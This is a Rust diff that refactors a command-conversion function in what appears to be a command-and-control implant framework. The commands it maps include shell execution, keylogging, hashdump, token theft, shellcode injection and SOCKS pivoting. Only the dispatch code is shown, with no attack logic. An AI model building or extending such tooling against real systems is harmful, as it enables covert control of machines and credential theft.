@@ -2455,40 +2455,58 @@ impl JsonCommand {
     /// Convert to a wire [`Command`]. `Upload` decodes its hex payload here; a
     /// malformed hex string is surfaced as an error for a 400 response.
     fn into_command(self) -> Result<Command, &'static str> {
-        Ok(match self {
-            JsonCommand::Ping => Command::Ping,
-            JsonCommand::Shell { args } => Command::Shell { args },
-            JsonCommand::Sleep { seconds, jitter_pct } => into_command_sleep(seconds, jitter_pct),
-            JsonCommand::Upload { name, data_hex } => into_command_upload(name, data_hex)?,
-            JsonCommand::Download { path } => Command::Download { path },
-            JsonCommand::Bof { name, args, data_hex } => into_command_bof(name, args, data_hex)?,
-            JsonCommand::FileOp { op, path, dest } => into_command_fileop(op, path, dest)?,
-            JsonCommand::Connect { host, port } => into_command_connect(host, port),
-            JsonCommand::Socks { chan, op, addr, port } => into_command_socks(chan, op, addr, port),
-            JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
-            JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
-            JsonCommand::Net { query } => Command::Net { query },
-            JsonCommand::Driveinfo => Command::DriveInfo,
-            JsonCommand::Clipboard => Command::Clipboard,
-            JsonCommand::Env { name } => Command::Env { name },
-            JsonCommand::Keylog { action } => Command::Keylog { action },
-            JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
-            JsonCommand::Hashdump { method } => Command::Hashdump { method },
-            JsonCommand::ChannelData { chan, data_hex } => into_command_channel_data(chan, data_hex)?,
-            JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
-            JsonCommand::StealToken { pid } => Command::StealToken { pid },
-            JsonCommand::MakeToken { domain, user, password, logon_type } => {
-                into_command_make_token(domain, user, password, logon_type)
-            }
-            JsonCommand::Rev2Self => Command::Rev2Self,
-            JsonCommand::GetUid => Command::GetUid,
-            JsonCommand::Inject { method, pid, spawn_to, sc_hex } => {
-                into_command_inject(method, pid, spawn_to, sc_hex)?
-            }
-            JsonCommand::Trex => Command::Trex,
-            JsonCommand::SetChannel { channel } => Command::SetChannel { channel },
-            JsonCommand::Exit => Command::Exit,
-        })
+        match self {
+            Self::Ping => Ok(Command::Ping),
+            Self::Shell { args } => Ok(Command::Shell { args }),
+            Self::Sleep {
+                seconds,
+                jitter_pct,
+            } => Ok(into_command_sleep(seconds, jitter_pct)),
+            Self::Upload { name, data_hex } => into_command_upload(name, data_hex),
+            Self::Download { path } => Ok(Command::Download { path }),
+            Self::Bof {
+                name,
+                args,
+                data_hex,
+            } => into_command_bof(name, args, data_hex),
+            Self::FileOp { op, path, dest } => into_command_fileop(op, path, dest),
+            Self::Connect { host, port } => Ok(into_command_connect(host, port)),
+            Self::Socks {
+                chan,
+                op,
+                addr,
+                port,
+            } => Ok(into_command_socks(chan, op, addr, port)),
+            Self::Screenshot { monitor } => Ok(Command::Screenshot { monitor }),
+            Self::Portscan { host, ports } => Ok(Command::Portscan { host, ports }),
+            Self::Net { query } => Ok(Command::Net { query }),
+            Self::Driveinfo => Ok(Command::DriveInfo),
+            Self::Clipboard => Ok(Command::Clipboard),
+            Self::Env { name } => Ok(Command::Env { name }),
+            Self::Keylog { action } => Ok(Command::Keylog { action }),
+            Self::Screenwatch { interval_secs } => Ok(Command::Screenwatch { interval_secs }),
+            Self::Hashdump { method } => Ok(Command::Hashdump { method }),
+            Self::ChannelData { chan, data_hex } => into_command_channel_data(chan, data_hex),
+            Self::ChannelClose { chan } => Ok(Command::ChannelClose { chan }),
+            Self::StealToken { pid } => Ok(Command::StealToken { pid }),
+            Self::MakeToken {
+                domain,
+                user,
+                password,
+                logon_type,
+            } => Ok(into_command_make_token(domain, user, password, logon_type)),
+            Self::Rev2Self => Ok(Command::Rev2Self),
+            Self::GetUid => Ok(Command::GetUid),
+            Self::Inject {
+                method,
+                pid,
+                spawn_to,
+                sc_hex,
+            } => into_command_inject(method, pid, spawn_to, sc_hex),
+            Self::Trex => Ok(Command::Trex),
+            Self::SetChannel { channel } => Ok(Command::SetChannel { channel }),
+            Self::Exit => Ok(Command::Exit),
+        }
     }
 }
 
